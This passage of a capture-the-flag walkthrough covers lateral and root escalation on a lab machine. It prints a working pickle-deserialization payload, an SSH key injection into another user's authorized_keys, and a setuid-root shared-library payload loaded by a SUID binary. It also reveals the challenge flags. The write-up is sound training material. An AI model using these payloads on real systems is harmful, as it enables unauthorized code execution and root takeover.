+<p>OK, so just a couple more housekeeping things to check before we go about creating a file that satisfies all the criteria. Firstly, does the "cupid" user have write access to the directory used for the spooler service? Initially it appears not, but we're in luck as the user in the right group for access:<br />
+<img alt="inbox access" src="inbox_access.png" />  </p>
+<p>Secondly, we can check the <code>config.ini</code> file in the main <code>heartbreak</code> directory to make sure we haven't missed anything. Actually it tells us we can expect to have confirmation of the exploit's success within 60 seconds of placing the malicious <code>.love</code> file in the directory:<br />
+<img alt="config.ini contents" src="config_contents.png" />  </p>
+<p>Alright, seems like everything is order. Let's try this thing! I created the following helper script to create the <code>.love</code> file with the malicious pickle payload:<br />
+<div class="highlight"><pre><span></span><code>import pickle
+import msgpack
+import os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, (&quot;id &gt; /tmp/rce_success&quot;,))
+
+# Create malicious pickle
+malicious_pickle = pickle.dumps(RCE())
+
+# Build required structure
+data = {
+    &quot;from&quot;: &quot;attacker&quot;,
+    &quot;to&quot;: &quot;victim&quot;,
+    &quot;desire&quot;: &quot;A&quot; * 60,  # Must be &gt;= 50 chars
+    &quot;compat&quot;: {
+        &quot;sign&quot;: &quot;aries&quot;,
+        &quot;element&quot;: &quot;fire&quot;,
+        &quot;planet&quot;: &quot;mars&quot;
+    },
+    &quot;notes&quot;: malicious_pickle  # MUST be bytes
+}
+
+# Pack as MessagePack
+packed = msgpack.packb(data, use_bin_type=True)
+
+with open(&quot;exploit.love&quot;, &quot;wb&quot;) as f:
+    f.write(packed)
+</code></pre></div></p>
+<p>I ran it on my attacker machine and copied it to the target machine with <code>scp</code>. Checking the <code>inbox</code> directory showed the upload had been successful. Waiting a few seconds and checking the log file specified in the <code>matching_engine.py</code> script (<code>/var/log/heartbreak/matcher.log</code>) showed that the file had been processed as desired by the heartbreak app:<br />
+<img alt="matcher log contents" src="matcher_log_contents.png" />  </p>
+<p>Checking the <code>/tmp</code> folder for our POC exploit output proves it has been successful, and that the command is being run as the "aphrodite" user:<br />
+<img alt="/tmp directory contents" src="tmp_directory_contents.png" />  </p>
+<p>So now to try and work out how to use that to actually gain the horizontal privilege escalation into the "aphrodite" user. I originally tried changing the command in the helper script to make a reverse shell connection but it didn't work - I suspect that has something to do with that <code>firewall.sh</code> script I found earlier. At this point in the challenge I do have a private key file for the "cupid" user. If I could add this to the <code>authorized_keys</code> file for the "aphrodite" user, there's a chance I might be able to <code>ssh</code> in as the "aphrodite user". Good thing this deserialization exploit executes as the "aphrodite" user, which will have write access to that very file. I updated the command in the helper script to the following:<br />
+<code>echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJI2BElPIcoG98ulZ3uuWJXR77CSYIs6u/g10Fhe76nv' &gt;&gt; /home/aphrodite/.ssh/authorized_keys</code>  </p>
+<p>After regenerating and uploading the new <code>.love</code> file to the victim machine, I waited until the <code>matcher.log</code> file described its processing. After that, logging in with <code>ssh</code> was trivial, getting us access to the next flag.</p>
+<details class="success">
+<summary>What is the second user flag?</summary>
+<p>THM{br0k3n_h34rts_l34k_s3cr3ts}</p>
+</details>
+<h2 id="vertical-privilege-escalation">Vertical privilege escalation</h2>
+<p>So doing some basic privilege escalation around the machine revealed a (pretty obviously non-standard) SUID binary that runs as <code>root</code>:<br />
+<img alt="SUID binary" src="suid_binary.png" />  </p>
+<p>Running the binary without any input gives us a bit of information as to what the binary does:<br />
+<img alt="heartstrings output" src="heartstrings_output.png" />  </p>
+<p>Running the binary with the <code>encrypt</code> and <code>decrypt</code> switches appears to prove the binary is functioning, but of more interest is the <code>status</code> switch output:<br />
+<img alt="heartstrings status output" src="heartstrings_status_output.png" />  </p>
+<p>This definitely got more interesting - a <code>root</code> SUID binary that loads external plugins? Sounds ripe for an external library exploit. I shouldn't have gotten so excited - examining the hardcoded directory for the plugins revealed two things:  </p>
+<ul>
+<li>The <code>manifest.json</code> file contains details of the plugins to use, including the SHA256 hash for the file. That file is writable by the "aphrodite" account that I was logged in as. So far so good.  </li>
+<li>The "aphrodite" user had no write access to the directory containing the plugin files. Not so good.</li>
+</ul>
+<p>Not to be beaten by a little thing like directory permissions, I took a look at the strings in the binary (had this not revealed anything, I would have progressed to exfiltrating it and decompiling with Ghidra. As it turned out, that wasn't necessary). Hidden amongst the known switches and outputs, there's a hidden switch:<br />
+<img alt="heartstrings hidden switch" src="heartstrings_hidden_switch.png" />  </p>
+<p>Ah now this brings the whole idea of loading in a malicious plugin back into play! This switch suggests that plugins can be loaded from the working directory when used with the <code>--dev</code> switch. This means that we should be able to create a malicious library file using <code>gcc</code> and get the SUID binary to load it using that <code>plugin</code> switch. Given the makeup of the binary, we will need to make sure our malicious plugin satisfies the description in the <code>manifest.json</code> file, but as the "aphrodite" user can edit that file, that shouldn't be an issue. I created a <code>.c</code> file with the following code:<br />
+<div class="highlight"><pre><span></span><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void __attribute__((constructor)) init() {
+    setuid(0);
+    setgid(0);
+    system(&quot;/bin/bash -p&quot;);
+}
+</code></pre></div></p>
+<p>That's a standard boilerplate code to escalate privilege - effectively it sets the effective and group IDs (<code>setuid</code> and <code>setgid</code>, respectively) as "root" (user ID of 0), launches a new <code>/bin/bash</code> instance and preserves those privileges - basically it provides a shell running as the "root" user. Before it can be used with the <code>heartstrings</code> binary, it needs to be compiled as a library with <code>gcc</code>. I ran the following command to achieve this:<br />
+<code>gcc -shared -fPIC -o evil.so evil.c</code>  </p>
+<p>This command is best run on the victim machine itself to ensure system compatibility. Next up, I needed to generate the SHA256 hash for the resulting <code>.so</code> file, which was easily achieved with <code>sha256sum</code>. This hash needed to be added to the <code>manifest.json</code> file, replacing one of the valid library file hashes already present. Using a text editor, this was easily achieved, and also provided the last piece of information needed in order for the <code>heartstrings</code> binary to successfully load the malicious library - the expected file name. Looking at the contents of the <code>manifest.json</code> file whilst editing the hash provided the file name detail:<br />
+<img alt="manifest.json contents" src="manifest_contents.png" /><br />
+<img alt="plugin directory contents" src="plugins_directory_content.png" />  </p>
+<p>With that, I renamed my <code>evil.so</code> file to <code>rosepetal.so</code>, replaced the rosepetal hash value with the hash value for my malicious library file, and ran the <code>heartstrings</code> binary in developer mode, loading in my rogue plugin and was successful in gaining <code>root</code> access immediately:<br />
+<img alt="root success" src="root_success.png" />  </p>
+<p>From there, finding the root flag was trivial:<br />
+<img alt="root flag success" src="root_flag_success.png" />  </p>
+<details class="success">
+<summary>What is the third flag?</summary>
+<p>THM{h34rtstr1ngs_4_u}</p>
+</details>
+<p><strong>Tools Used</strong><br />
+<code>Burp</code> <code>python3</code> <code>gcc</code></p>
+<p><strong>Date completed:</strong> 01/03/26<br />
+<strong>Date published:</strong> 01/03/26</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/janekpstudentuad" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/jane-kocan-payne-662692166/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.expand", "navigation.sections", "content.code.copy", "content.code.annotate", "search.suggest"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
